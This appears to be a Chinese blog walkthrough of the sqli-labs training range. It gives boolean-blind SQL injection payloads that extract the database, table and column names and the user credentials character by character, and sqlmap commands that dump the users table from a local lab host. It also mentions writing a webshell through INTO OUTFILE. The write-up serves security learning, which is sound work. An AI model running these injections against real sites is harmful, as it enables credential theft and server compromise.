---
title: sql注入
published: 2026-10-13
description: 本篇介绍sqli-labs靶场的通关教程
tags: [sql]
category: 笔记
---
  
# 联合注入

## less-1~4

# 报错注入

## less-5~6

(详情以后再说)

# 布尔盲注

## less-7

发现闭合方式 `?id=1'))--+ `

尝试用报错注入：

![](https://picgocloud.com/m/f9118f0a-d006-423e-b302-2f75ef6558c7.png)

页面上不能返回具体的错误信息，因此使用布尔盲注

**第一步盲注库名**

首先判断盲注数据库名长度

    ?id=1')) and length(database())=8--+

接着盲注库名

    ?id=1')) and substr(database(),1,1)='s'--+
    ?id=1')) and substr(database(),2,1)='e'--+
    ...
    ?id=1')) and substr(database(),8,1)='y'--+

得到数据库名为`security`

**第二步盲注表名**

首先判断`security`表的数量

    ?id=1')) and (select count(table_name) from information_schema.tables where table_schema='security')=4--+

第一张表的长度

    ?id=1')) and length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6--+

表名

    ?id=1')) and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'--+
    
    ?id=1')) and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1)='m'--+
    ...

得到第一张表的名字是`emails`

通过更改limit值，可以推出其余三个表名`referers` `uagents` `users`

**第三步盲注列名(字段名)**

首先还是判断列的数量

    ?id=1')) and (select count(column_name) from information_schema.columns where table_schema='security' and table_name='users')=3--+

第一列列名长度

    ?id=1')) and length((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1))=2--+

最后列名

    ?id=1')) and (substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),1,1))='i'--+
    ?id=1')) and (substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),2,1))='d'--+

同样的方法得到三列列名分别是`id` `username` `password`

**第四步盲注数据**

表中用户数量

    ?id=1')) and (select count(*) from users)=13--+

我们要得到`username`和`password`两列的数据

第一个用户名的长度

    ?id=1')) and length((select username from users limit 0,1))=4--+

第一个用户名

    ?id=1')) and (substr((select username from users limit 0,1),1,1))='d'--+

    ?id=1')) and (substr((select username from users limit 0,1),2,1))='u'--+
    ...
得到第一个用户名`dumb`

第一个密码长度

    ?id=1')) and length((select password from users limit 0,1))=4--+

第一个密码

    ?id=1')) and (substr((select password from users limit 0,1),1,1))='d'--+

    ?id=1')) and (substr((select password from users limit 0,1),2,1))='u'--+
    ...
得到第一个密码`dumb`

还是通过更改limit可以得到其余13个用户名及密码

经典解法：利用MySQL的into outfile 函数，把一句话木马写进服务器目录，从而 getshell（获取服务器权限）

## less-8

闭合方式`?id=1'--+`

原理同less-7

这里使用工具sqlmap进行快速破解

打开kali虚拟机

1.指定注入点

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'"

![](<https://img.remit.ee/i/TivIRB8uGaL0>)
![](<https://img.remit.ee/i/Zw4kCq9rNGT6>)
可以看到数据库版本等信息

2.获取全部数据库

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" --dbs

![](<https://img.remit.ee/i/evergcIhuRLd>)

获取当前数据库

     sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" --current-db

![](<https://img.remit.ee/i/WPa5bHnbijM8>)

可以看到是`security`

3.获取表

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' --tables

![](<https://img.remit.ee/i/hQqyGqtlO6U7>)

可以看到表的数量及各自的名称

4.获取字段

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' -T 'users' --columns

![](<https://img.remit.ee/i/HBEr5WLYybUt>)

5.获取数据

    sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' -T 'users' -C 'username,password' --dump

![](<https://img.remit.ee/i/TCmLm6XllzJD>)

OK了

